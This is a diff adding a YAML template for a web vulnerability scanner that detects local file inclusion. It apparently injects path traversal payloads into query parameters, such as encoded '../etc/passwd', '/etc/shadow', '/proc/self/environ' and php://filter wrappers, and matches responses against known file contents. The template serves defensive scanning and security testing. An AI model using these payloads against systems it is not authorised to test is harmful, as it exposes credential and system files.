@@ -1,0 +1,44 @@
+id: lfi
+info:
+  name: "Local File Inclusion"
+  severity: high
+  description: "Detects LFI by injecting path traversal payloads and checking for known file contents"
+  tags: [lfi, file-inclusion, traversal]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "../../../../../../etc/passwd"
+  - "../../../../../../etc/passwd%00"
+  - "....//....//....//....//....//etc/passwd"
+  - "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+  - "..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+  - "..\\..\\..\\..\\..\\..\\etc\\passwd"
+  - "/etc/passwd"
+  - "../../../../../../etc/shadow"
+  - "../../../../../../etc/hosts"
+  - "../../../../../../windows/win.ini"
+  - "../../../../../../windows/system32/drivers/etc/hosts"
+  - "..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini"
+  - "....\\\\....\\\\....\\\\....\\\\windows\\\\win.ini"
+  - "/proc/self/environ"
+  - "../../../../../../proc/self/environ"
+  - "php://filter/convert.base64-encode/resource=index.php"
+  - "php://filter/read=string.rot13/resource=index.php"
+  - "file:///etc/passwd"
+
+matchers:
+  body_patterns:
+    - "root:.*:0:0:"
+    - "daemon:.*:/usr/sbin"
+    - "\\[fonts\\]"
+    - "\\[extensions\\]"
+    - "for 16-bit app support"
+    - "HTTP_USER_AGENT"
+    - "DOCUMENT_ROOT"
+    - "REMOTE_ADDR"
+    - "(?i)failed to open stream"
+    - "(?i)No such file or directory"
+    - "(?i)include_path"
